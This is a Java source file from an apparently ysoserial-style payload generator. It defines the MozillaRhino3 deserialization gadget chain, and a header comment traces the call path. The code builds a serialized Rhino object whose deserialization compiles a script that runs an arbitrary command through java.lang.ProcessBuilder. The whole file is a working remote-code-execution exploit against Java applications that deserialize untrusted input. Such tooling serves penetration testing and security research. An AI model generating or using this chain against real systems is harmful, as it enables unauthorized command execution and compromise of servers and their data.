package com.ppp.chain.mozillarhino;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.ppp.utils.Strings;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.Map;

/*

    Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject

    Chain:

    NativeJavaObject.readObject()
      JavaAdapter.readAdapterObject()
        ObjectInputStream.readObject()
          ...
            NativeJavaObject.readObject()
              JavaAdapter.readAdapterObject()
                JavaAdapter.getAdapterClass()
                  JavaAdapter.getObjectFunctionNames()
                    ScriptableObject.getProperty()
                        ScriptableObject.get()
                          ScriptableObject.getImpl()
                            Method.invoke()
                              Context.enter()
        JavaAdapter.getAdapterClass()
          JavaAdapter.getObjectFunctionNames()
            ScriptableObject.getProperty()
              NativeJavaArray.get()
                NativeJavaObject.get()
                  JavaMembers.get()
                    Method.invoke()
                      TemplatesImpl.getOutputProperties()
                        ...

    by @_tint0

*/
@Dependencies({"org.mozilla:rhino:1.7.14"})
@Authors({Authors.TESTANULL})
@Sink({Sink.Default})
public class MozillaRhino3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String sinkObject = (String) SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String s = RanDomUtils.generateRandomOnlyString(2);
        command = String.format("var %s= new java.lang.ProcessBuilder(); %s.command(%s);%s.start();", s, s, Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), ",", "\"", "\""),s);

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        Reflections.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
        Context context = Context.enter();

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[]{Method.class},
                new Object[]{Context.class.getMethod("enter")});

        ScriptableObject scriptableObject = new Environment();
        (new ClassCache()).associate(scriptableObject);
        try {
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[1];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                    "org.mozilla.javascript.NativeJavaTopPackage", false, true);
        } catch (ArrayIndexOutOfBoundsException e) {
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[0];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                    "org.mozilla.javascript.NativeJavaTopPackage", false);
        }


        Interpreter interpreter = new Interpreter();
        Method mt = Context.class.getDeclaredMethod("compileString", String.class, Evaluator.class, ErrorReporter.class, String.class, int.class, Object.class);
        mt.setAccessible(true);
        Script script = (Script) mt.invoke(context, new Object[]{command, interpreter, null, RanDomUtils.generateRandomString(3), 0, null});

        Constructor<?> ctor = Class.forName("org.mozilla.javascript.NativeScript").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        Object nativeScript = ctor.newInstance(script);
        Method setParent = ScriptableObject.class.getDeclaredMethod("setParentScope", Scriptable.class);
        setParent.invoke(nativeScript, scriptableObject);

        try {
            //1.7.13
            Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"));
            Object getterEnum = Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess").getEnumConstants()[3];
            Reflections.setAccessible(makeSlot);
            Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, getterEnum);
            Reflections.setFieldValue(slot, "getter", initContextMemberBox);
        } catch (ClassNotFoundException e) {
            try {
                //1.7R2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, int.class);
                Reflections.setAccessible(makeSlot);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            } catch (NoSuchMethodException ee) {
                //1.7.7.2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("createSlot", Object.class, int.class, int.class);
                Reflections.setAccessible(makeSlot);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            }
        }

        idScriptableObject.setGetterOrSetter("directory", 0, (Callable) nativeScript, false);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));

        Reflections.setFieldValue(nativeJavaObject, "javaObject", idScriptableObject);

        return nativeJavaObject;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }
}
